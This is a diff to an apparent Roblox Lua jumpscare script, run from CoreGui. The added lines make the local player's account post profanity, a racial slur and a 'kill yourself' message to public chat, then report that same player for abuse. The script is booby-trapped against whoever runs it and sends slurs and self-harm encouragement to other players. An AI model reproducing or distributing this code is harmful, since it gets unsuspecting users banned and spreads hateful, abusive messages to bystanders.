@@ -1,3 +1,4 @@
+task.wait(2)
 local coregui = game:service'CoreGui'
 
 local sound = Instance.new('Sound', coregui)
@@ -27,6 +28,12 @@ end
 game:service'UserInputService'.MouseIconEnabled = false
 sound:Play()
 image.Visible = true
+
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("fuck","All")
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("nigga","All")
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("kill yoursef","All")
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("shut the fuck up","All")
+game.Players:ReportAbuse(game.Players.LocalPlayer,"Swearing", "saying mean words")
 
 task.wait(1)
 
